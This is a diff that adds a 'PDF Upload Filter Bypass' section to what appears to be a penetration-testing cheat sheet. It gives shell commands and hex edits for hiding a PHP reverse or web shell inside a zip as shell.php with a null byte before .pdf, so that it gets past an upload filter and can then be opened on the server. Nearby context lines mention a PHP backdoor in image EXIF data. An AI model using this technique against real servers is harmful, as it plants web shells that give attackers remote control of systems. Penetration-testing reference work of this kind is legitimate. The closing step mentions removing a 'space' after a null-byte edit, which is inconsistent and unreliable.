@@ -218,6 +218,31 @@ $ http_proxy=localhost:8080 https_proxy=localhost:8080 <COMMAND> <RHOST>
 * file.jpg with php backdoor in exif (see below)
 * .jpg -> proxy intercept -> rename to .php
 
+### PDF Upload Filter Bypass
+
+Create a `PHP Reverse / Web Shell`, name it `shell.phpX.pdf` and `zip` it.
+
+```c
+$ touch shell.phpX.pdf
+$ zip shell.zip shell.phpX.pdf
+```
+
+Open the `Zip Archive` in your favourite `Hex Editor`.
+
+```c
+00000A80  00 01 00 00 00 A4 81 00  00 00 00 73 68 65 6C 6C  ...........shell
+00000A90  2E 70 68 70 58 2E 70 64  66 55 54 05 00 03 A3 6F  .phpX.pdfUT....o
+```
+
+Replace the `X` with `Null Bytes (00)` and save it.
+
+```c
+00000A80  00 01 00 00 00 A4 81 00  00 00 00 73 68 65 6C 6C  ...........shell
+00000A90  2E 70 68 70 00 2E 70 64  66 55 54 05 00 03 A3 6F  .php..pdfUT....o
+```
+
+After uploading you can remove the `space` and access the file.
+
 ## Command Injection
 
 ### Vulnerable Functions in PHP
